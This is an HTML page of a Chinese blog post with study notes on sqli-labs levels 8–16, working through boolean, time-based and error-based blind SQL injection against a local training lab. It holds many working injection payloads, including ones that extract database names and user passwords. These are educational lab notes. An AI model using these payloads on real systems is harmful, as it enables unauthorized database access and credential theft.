@@ -1,0 +1,1325 @@
+<!DOCTYPE html>
+
+
+<script type="text/javascript" color="0,0,255" opacity="0.7" zindex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="google-site-verification" content="KbsMGM-cxbXLL8_ZMgd9HoISLGQPx2GAvxaINp0qzhQ">
+
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="iHKOwnN4RR">
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=5.1.4">
+
+
+
+
+
+
+
+  <meta name="keywords" content="SQL,Web安全,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Less-8 基于布尔盲注游戏进行到这里，按照正常的剧情难度应该增加，这里有必要学习一下SQL盲注。 SQL盲注何为盲注？在我们执行sql语句后，选择的数据不能回显到前端页面。这时候我们需要利用一些方法进行判断或尝试，这个过程称为盲注。盲注分为三类：">
+<meta name="keywords" content="SQL,Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs8-16学习笔记">
+<meta property="og:url" content="http://www.lntro.xyz/sqli-labs8-16学习笔记/index.html">
+<meta property="og:site_name" content="风再起时">
+<meta property="og:description" content="Less-8 基于布尔盲注游戏进行到这里，按照正常的剧情难度应该增加，这里有必要学习一下SQL盲注。 SQL盲注何为盲注？在我们执行sql语句后，选择的数据不能回显到前端页面。这时候我们需要利用一些方法进行判断或尝试，这个过程称为盲注。盲注分为三类：">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less13.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less14.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less15.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less16.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less17.png">
+<meta property="og:updated_time" content="2018-12-07T05:09:55.141Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqli-labs8-16学习笔记">
+<meta name="twitter:description" content="Less-8 基于布尔盲注游戏进行到这里，按照正常的剧情难度应该增加，这里有必要学习一下SQL盲注。 SQL盲注何为盲注？在我们执行sql语句后，选择的数据不能回显到前端页面。这时候我们需要利用一些方法进行判断或尝试，这个过程称为盲注。盲注分为三类：">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less13.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.lntro.xyz/sqli-labs8-16学习笔记/">
+
+
+
+
+
+  <title>sqli-labs8-16学习笔记 | 风再起时</title>
+  <style>
+  .forkme{
+    display: none;
+  }
+  @media (min-width: 768px) {
+    .forkme{
+      display: inline;
+    }
+  }
+  </style>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?104760bf60098b3f7427cfbfb6fcefb6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+  <div class="forkme">
+    <a href="https://github.com/1ntro"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
+  </div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">风再起时</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">你看，整片星空都是我的</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.lntro.xyz/sqli-labs8-16学习笔记/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Intro">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://raw.githubusercontent.com/1ntro/image/master/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="风再起时">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqli-labs8-16学习笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-29T23:28:35+08:00">
+                2018-09-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQL注入/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Less-8-基于布尔盲注"><a href="#Less-8-基于布尔盲注" class="headerlink" title="Less-8 基于布尔盲注"></a>Less-8 基于布尔盲注</h2><p>游戏进行到这里，按照正常的剧情难度应该增加，这里有必要学习一下SQL盲注。</p>
+<h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><p>何为盲注？在我们执行sql语句后，选择的数据不能回显到前端页面。这时候我们需要利用一些方法进行判断或尝试，这个过程称为盲注。<br><strong>盲注分为三类：</strong></p>
+<a id="more"></a>
+<ol>
+<li>基于布尔盲注，布尔也就是true和false，他只会根据你的注入信息返回true或false，也就是说我们得不到报错信息</li>
+<li>基于时间盲注，页面返回值只有一种，无论输入什么值都会按正常处理。加入特定的时间函数，通过web页面返回的时间差来判断注入语句是否正确</li>
+<li>基于报错盲注，构造payload让信息通过错误提示回显出来</li>
+</ol>
+<h4 id="基于布尔盲注"><a href="#基于布尔盲注" class="headerlink" title="基于布尔盲注"></a>基于布尔盲注</h4><p>这里用到几个函数：<br><strong>Left()</strong><br><code>left(database(),1)&gt;&#39;s&#39;</code> //database()显示数据库名称，left(a,b)从左边截取a的前b位进行测试<br><strong>Substr()</strong><br><code>substr(database(),1,1)&gt;&#39;a&#39;</code> //查看database()第一位的第一个字符<br><code>substr(database(),2,1)&gt;&#39;a&#39;</code> //同理，查看第二位的第一个字符<br><strong>Ascii()</strong><br>将某个字符转换成它的ASCII码<br><strong>ord()</strong><br><code>ord(mid(database(),1,1))&gt;114</code> //ord()函数返回第一个字符的ASCII码，mid()函数和substr()类似<br><strong>regexp正则注入</strong><br>因为在MYSQL 5+中information_schema库中存储了所有的库名，表名以及字段名信息，所以：</p>
+<ol>
+<li>判断第一个表名的第一个字符是否为<code>a-z</code>中的字符，假设<code>security</code>是已知库名<br><code>?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE  TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#39;^[a-z]&#39; LIMIT 0,1) --+</code></li>
+<li>判断第一个表名的第一个字符是否为<code>a-n</code>中的字符<br><code>?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#39;^[a-n]&#39; LIMIT 0,1)--+</code></li>
+<li>判断该字符为n<br><code>?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#39;^n&#39; LIMIT 0,1) --+</code></li>
+<li>表达式更换<br><code>&#39;^n[a-z]&#39; -&gt; &#39;^ne[a-z]&#39; -&gt; &#39;^new[a-z]&#39; -&gt; &#39;^news[a-z]&#39; -&gt; FALSE</code><br>这里简单介绍下，欲知详情<a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">点击这里</a></li>
+</ol>
+<h4 id="基于时间盲注"><a href="#基于时间盲注" class="headerlink" title="基于时间盲注"></a>基于时间盲注</h4><p><strong>sleep()函数</strong><br><code>sleep(seconds)</code>表示函数代码执行延迟若干秒<br><strong>BENCHEMARK()函数</strong><br><code>BENCHEMARK(count,expr)</code>表示重复执行expr若干次<br><strong>if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))%23</strong>  //if判断语句，条件为假执行sleep</p>
+<h4 id="基于报错盲注"><a href="#基于报错盲注" class="headerlink" title="基于报错盲注"></a>基于报错盲注</h4><p>感觉这个有点类似前面的<a href="http://lntro.xyz/2018/09/26/sqli-labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more" target="_blank" rel="noopener">双查询注入</a></p>
+<h3 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h3><p>开始用<code>?id=1&#39;</code>没有回显，<code>?id=1&#39;--+</code>得到回显，然后通过上面的函数构造一个函数猜测数据库名长度<code>(length(database()))&gt;10</code>，最后得到长度为8<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less13.png" alt="1539010328564"><br>接下来利用substr函数和ascii函数构造猜测数据库名的ascii码值，语句如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (ascii(substr(database(),1,1)))&gt;100--+ //返回正确说明第一个字母的ascii码大于100</span><br><span class="line">?id=1&apos; and (ascii(substr(database(),1,1)))&gt;120--+ //返回错误</span><br><span class="line">?id=1&apos; and (ascii(substr(database(),1,1)))=115--+ //返回正确，说明第一个字母的ascii码为115，即为s</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&apos; and (ascii(substr(database(),2,1)))=101--+ //同理猜出第二个字母为e</span><br></pre></td></tr></table></figure>
+
+<p>经过测试得到数据库名为<strong>‘security’</strong>，接下来猜测表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100--+  //类似的稍微修改一下</span><br></pre></td></tr></table></figure>
+
+<p>得知第一个表名为<strong>‘email’</strong>，结果正确，接着我们猜测user表的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1)))=117--+ //由于机器上装了DVWA所以这里users表有两个结果可能有些出入</span><br></pre></td></tr></table></figure>
+
+<p>通过修改limit 0,1来得到第二个列名，修改后面的1，1得到当前列的其他字段。<br>接着获取username和password里面的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (ascii(substr((select password from users limit 0,1),1,1)))=68--+ //ascii(68)=D 正确</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-9-基于时间盲注"><a href="#Less-9-基于时间盲注" class="headerlink" title="Less-9 基于时间盲注"></a>Less-9 基于时间盲注</h2><p>无论我们输入的语句是否正确，都只返回<strong>You are in……</strong>，所以这里用到时间盲注（根据返回结果的时间长短判断注入语句是否执行）<br><strong>猜解数据库：</strong><br><code>id=1&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code><br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less14.png" alt="1539075273358">可以看到时间只有1s，所以猜解正确，数据库的第一位是ascii(115)也就是’s’，修改payload<code>id=1&#39; and if(ascii(substr(database(),2,1))=101,1,sleep(5))--+</code>继续猜解第二位第三位…<br>最后可以猜解到数据库的名称为”security”<br><strong>猜解security库的表名：</strong><br><code>?id=1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,1,sleep(5))--+</code><br>猜解出第一个表的第一位是e，也就是第一个表”email”，修改<code>limit 1,1</code>继续猜解后面的表，得到我们需要的<code>user</code>表<br>不得不说手工盲注挺繁琐的，这里因为括号太多导致payload一直出错，但是掌握手工盲注的原理对以后使用工具有很大帮助<br><strong>猜解user表的列名：</strong><br><code>?id=1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;user&#39; limit 0,1),1,1))=105,1,sleep(5))--+</code>或者<code>?id=1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() limit 0,1),1,1))=105,1,sleep(5))--+</code>由于本机上存在多个users表，所以我用的第二种，原理是一样的，只是这里限定条件不同，因为这里security库只有一个：<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less15.png" alt="1539077562078"><br><strong>猜解字段值：</strong><br>最后就是获取username和password的值啦，比较简单直接给payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+ //username第一位</span><br><span class="line">?id=1&apos; and if(ascii(substr((select password from users limit 0,1),1,1))=68,1,sleep(5))--+ //password第一位</span><br></pre></td></tr></table></figure>
+
+<p>这道题还可以用benchmark()函数<br><code>?id=1&#39; union select if(ascii(substring(database(),1,1)) = 115, benchmark(100000000,encode(&#39;hello&#39;,&#39;hi&#39;)), null),1,1  --+</code>如果正确会等待很长一段时间，根据自己构造的payload可以灵活使用</p>
+<h2 id="Less-10-基于时间盲注"><a href="#Less-10-基于时间盲注" class="headerlink" title="Less-10 基于时间盲注"></a>Less-10 基于时间盲注</h2><p>本题从题目就可以知道是基于双引号，参考Less-9只需要将单引号改为双引号就OK了！</p>
+<h2 id="Less-11-基于错误盲注"><a href="#Less-11-基于错误盲注" class="headerlink" title="Less-11 基于错误盲注"></a>Less-11 基于错误盲注</h2><p>到了这一关就和前面不太一样了，发现前面都是基于<code>GET</code>的注入点，这里在URL中找不到id等字段，说明应该是POST注入。<br>首先输入<code>uname=1&#39;&amp;passwd=aaa</code>从报错信息可以知道SQL语句为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname=$_POST[&apos;uname&apos;];</span><br><span class="line">$passwd=$_POST[&apos;passwd&apos;];</span><br><span class="line">SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>于是构造<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less16.png" alt="1539082958795"><br><code>SELECT username, password FROM users WHERE username=&#39;admin&#39;#&#39;&#39; and password=&#39;123&#39; LIMIT 0,1</code>=&gt;<code>SELECT username, password FROM users WHERE username=&#39;admin&#39;</code><br>到这里能看得出来和Less-1差不多，那么就按照正常步骤来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">构造payload对username注入，password为空</span><br><span class="line">1&apos; order by 1#  //正常</span><br><span class="line">1&apos; order by 2#  //正常</span><br><span class="line">1&apos; order by 3#  //报错，说明只有两行</span><br><span class="line">1&apos; union select 1,group_concat(schema_name) from information_schema.schemata#  //爆库</span><br><span class="line">1&apos; union select 1,database()  //得到当前数据库为security</span><br><span class="line">1&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#  //爆表</span><br><span class="line">1&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;#  //爆列名</span><br><span class="line">1&apos; union select username,password from users where id=2#  //爆数据</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-12-基于错误盲注"><a href="#Less-12-基于错误盲注" class="headerlink" title="Less-12 基于错误盲注"></a>Less-12 基于错误盲注</h2><p>username输入<code>admin&#39;</code>没有回显，<code>admin&quot;</code>返回报错，由报错信息知对数据进行了<strong>(“$usrname”)</strong>，于是构造<code>admin&quot;)#</code>即可，在Less-11的基础上稍加修改就OK</p>
+<h2 id="Less-13-双注入查询"><a href="#Less-13-双注入查询" class="headerlink" title="Less-13 双注入查询"></a>Less-13 双注入查询</h2><p>经过测试，发现对数据进行<strong>(‘$usrname’)</strong>处理，而且没有回显的数据，只能看到报错的回显，于是这里想到前面的双注入查询也就是盲注</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos;) union select count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a#</span><br><span class="line"> //基于报错的盲注</span><br><span class="line">admin&apos;) and left(database(),1)=&apos;s&apos;# //基于布尔的盲注</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-14-双注入查询"><a href="#Less-14-双注入查询" class="headerlink" title="Less-14 双注入查询"></a>Less-14 双注入查询</h2><p>直接测试username：admin” &amp; password：空<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less17.png" alt="1539089068302"><br>可知过滤为<strong>“usrname”</strong>，然后开始盲注和上一题类似不做累赘。<br>学点新姿势：基于extractvalue()和updatexml()的报错注入,给个<a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036" target="_blank" rel="noopener">地址</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</span><br><span class="line">admin&quot; and extractvalue(1,concat(0x7e,(select database()),0x7e))#</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-15-基于布尔-时间盲注"><a href="#Less-15-基于布尔-时间盲注" class="headerlink" title="Less-15 基于布尔/时间盲注"></a>Less-15 基于布尔/时间盲注</h2><p>此题貌似没有回显，应该是要基于时间的盲注，经过测试发现进行了<strong>‘username’</strong>处理，直接给payload：<br><code>admin&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(5))#</code>步骤类似Less-9，这里不测试了</p>
+<h2 id="Less-16-基于布尔-时间盲注"><a href="#Less-16-基于布尔-时间盲注" class="headerlink" title="Less-16 基于布尔/时间盲注"></a>Less-16 基于布尔/时间盲注</h2><p>经过测试，数据处理格式为<strong>(“username”)</strong>，和Less-15一样，将<strong>‘</strong>改为<strong>“)</strong>就OK</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>做到这里感觉最基础的SQL注入知识就差不多掌握了，感觉系统的学习是对提升最有帮助的，路还很长要加油鸭！</p>
+
+      
+    </div>
+    <div>
+      
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">
+              -------------本文结束<i class="fa fa-paw"></i>感谢阅读-------------
+        </div>
+    
+</div>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>谢谢您请我吃糖~</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="https://raw.githubusercontent.com/1ntro/image/master/wechat.png" alt="Intro 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="https://raw.githubusercontent.com/1ntro/image/master/pay.png" alt="Intro 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags"> 
+		  
+ 		    <a href="/tags/SQL/" rel="tag"><i class="fa fa-tag"></i> SQL</a> 
+		  
+ 		    <a href="/tags/Web安全/" rel="tag"><i class="fa fa-tag"></i> Web安全</a> 
+		   
+		</div>
+		
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/sqli-labs1-7学习笔记/" rel="next" title="sqli-labs1-7学习笔记">
+                <i class="fa fa-chevron-left"></i> sqli-labs1-7学习笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/sqli-labs17-22学习笔记/" rel="prev" title="sqli-labs17-22学习笔记">
+                sqli-labs17-22学习笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80MTUxNS8xODA2Mg=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://raw.githubusercontent.com/1ntro/image/master/avatar.jpg" alt="Intro">
+            
+              <p class="site-author-name" itemprop="name">Intro</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://paper.seebug.org/" title="Seebug" target="_blank">Seebug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://github.com/CHYbeta/Web-Security-Learning" title="Web安全资源" target="_blank">Web安全资源</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sec-wiki.com/skill/2" title="Web安全工程师" target="_blank">Web安全工程师</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-8-基于布尔盲注"><span class="nav-number">1.</span> <span class="nav-text">Less-8 基于布尔盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL盲注"><span class="nav-number">1.1.</span> <span class="nav-text">SQL盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基于布尔盲注"><span class="nav-number">1.1.1.</span> <span class="nav-text">基于布尔盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于时间盲注"><span class="nav-number">1.1.2.</span> <span class="nav-text">基于时间盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于报错盲注"><span class="nav-number">1.1.3.</span> <span class="nav-text">基于报错盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#回到题目"><span class="nav-number">1.2.</span> <span class="nav-text">回到题目</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-9-基于时间盲注"><span class="nav-number">2.</span> <span class="nav-text">Less-9 基于时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-10-基于时间盲注"><span class="nav-number">3.</span> <span 